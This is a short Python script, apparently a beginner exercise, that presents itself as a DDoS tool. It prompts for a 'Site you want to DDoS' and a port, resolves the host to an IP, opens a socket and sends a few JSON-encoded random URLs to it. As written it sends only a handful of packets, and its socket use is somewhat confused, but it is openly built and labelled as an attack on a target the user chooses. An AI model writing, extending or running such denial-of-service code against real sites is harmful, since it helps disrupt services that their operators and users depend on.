from helpers import get_random_url
import json
import socket


def ddos_attack(ip_address, port):
    try:
        # Create a socket and save it in ddos variable
        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket using ip_address and port
        ddos.connect((ip_address, port))

        # Use get_random_url() function to generate random url and save it in random_url 
        random_url = get_random_url()

        # Use json.dumps() to convert random_url to json and then encode it and save it in message variable
        message = json.dumps(random_url).encode()

        # Use send() and sendto() methods on ddos socket to send the message
        ddos.send(message)
        ddos.sendto(message, (ip_address, port))
        ddos.send(message)

        # Close the ddos socket
        ddos.close()

    except Exception as err:
        print(err)


def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    # Use socket.gethostbyname(host) to get ip of the website's server and store it in ip_address variable
    ip_address = socket.gethostbyname(host)

    print("|| DDoS Loaded ||")

    # Call ddos_attack function with ip and port
    ddos_attack(ip_address, port)


if __name__ == "__main__":
    main()
